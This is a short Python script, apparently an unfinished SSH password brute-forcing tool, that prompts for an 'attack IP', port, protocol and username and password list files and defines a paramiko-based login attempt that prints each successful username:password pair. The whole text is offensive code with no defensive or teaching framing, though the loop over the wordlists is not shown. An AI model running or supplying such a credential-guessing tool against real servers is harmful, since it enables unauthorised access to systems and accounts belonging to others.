# -*- coding: utf-8 -*-
"""
Spyder Editor

This is a temporary script file.
"""

import time
import paramiko

start_time = time.time()

target_ip = input("Enter attack IP: ")
target_port = int(input("Enter port no.: "))
protocol = input("Enter protocol type (ssh/ftp/http/smtp): ").lower()
username_file = input("Enter your username file: ")
password_file = input("Enter your password file: ")
timeout_seconds = int(input("Enter your time (seconds): "))

def try_ssh_login(host, port, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=host, port=port, username=username, password=password, timeout=timeout_seconds)
        print(f"[SSH attack successful👌] {username}:{password}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[SSH FAIL😢] {username}:{password}")
    except Exception as e:
        print(f"[SSH ERROR👾] {e}")
    return False